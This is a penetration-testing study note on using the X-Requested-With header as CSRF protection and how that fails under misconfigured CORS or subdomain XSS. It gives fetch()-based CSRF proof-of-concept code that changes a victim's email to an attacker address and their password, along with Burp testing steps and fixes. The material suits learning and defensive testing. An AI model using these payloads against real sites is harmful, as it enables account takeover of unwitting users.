---
tags: [vapt, http-headers, web, intermediate]
difficulty: intermediate
module: "03 - HTTP Headers"
topic: "03.33 X-Requested-With — CSRF Bypass in AJAX"
---

# 03.33 — X-Requested-With

## What is it?

`X-Requested-With: XMLHttpRequest` is a non-standard header added by jQuery and other AJAX libraries to identify requests made via JavaScript's XMLHttpRequest (XHR). Some apps use its presence as a CSRF protection mechanism — they allow requests only if this header is present (since browsers don't automatically send it on cross-origin form submissions).

---

## How CSRF "Protection" via X-Requested-With Works

```
APP LOGIC (common but flawed CSRF protection):
  if request.headers.get('X-Requested-With') != 'XMLHttpRequest':
      return 403  # Assume CSRF attempt!
  else:
      # Proceed (assume it's a legitimate AJAX call)

PROBLEM:
  Custom request headers trigger CORS preflight!
  But the protection check is bypassable in other ways.
```

---

## Attack 1: CSRF Bypass via X-Requested-With

```
PREREQUISITE: Same-Origin CORS policy prevents cross-origin custom headers.
              BUT if CORS is misconfigured (Access-Control-Allow-Origin: *):
  
  Attacker page:
  fetch('https://target.com/api/change-email', {
    method: 'POST',
    headers: {
      'X-Requested-With': 'XMLHttpRequest',  ← add the "magic" header
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({email: 'attacker@evil.com'}),
    credentials: 'include'
  })
  
  → CORS allows request (wildcard or reflected origin)
  → X-Requested-With present → app thinks it's legitimate AJAX!
  → CSRF succeeds!
```

---

## Attack 2: Direct CORS Bypass

```
If CORS is configured correctly, cross-origin requests can't include
custom headers without preflight. But:

WORKAROUND 1: Flash (historical) could bypass this — no longer relevant
WORKAROUND 2: From a compromised subdomain → same-site → custom headers allowed!

→ Subdomain XSS + CSRF via X-Requested-With bypass!
```

---

## When This "Protection" Is Actually Effective

```
EFFECTIVE:
  - CORS not misconfigured (proper Access-Control-Allow-Origin)
  - No subdomain XSS
  - No Flash/plugin exploits
  
INEFFECTIVE:
  - CORS wildcard/reflected → bypass easy
  - Same-site context attack (subdomain takeover + XSS)
  - Server-side request forgery (SSRF can set any header)
```

---

## Testing

```bash
# Test if app relies only on X-Requested-With for CSRF protection
# 1. Intercept a state-changing request with Burp
# 2. Remove all cookies → still check if X-Requested-With matters
# 3. Try removing X-Requested-With → does it 403?
# 4. Try from Burp Repeater (no cookies, no X-Requested-With)

# If adding X-Requested-With: XMLHttpRequest bypasses auth → BAD design!

# CSRF PoC (if CORS is also misconfigured):
cat > xrw-csrf.html << 'EOF'
<html>
<body>
<script>
fetch('https://TARGET/api/change-password', {
  method: 'POST',
  headers: {
    'X-Requested-With': 'XMLHttpRequest',
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({password:'hacked'}),
  credentials: 'include'
})
</script>
</body>
</html>
EOF
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| CSRF protection relies only on X-Requested-With | Use proper CSRF tokens (synchronizer pattern) |
| CORS misconfigured | Fix CORS to prevent custom header injection |
| No SameSite cookies | Add SameSite=Strict to session cookies |

---

## Related Notes
- [[16 - Origin]] — Origin header and CORS
- [[Module 07 - CSRF]] — comprehensive CSRF protection
- [[02.28 - Same-Origin Policy]] — SOP and CORS interactions
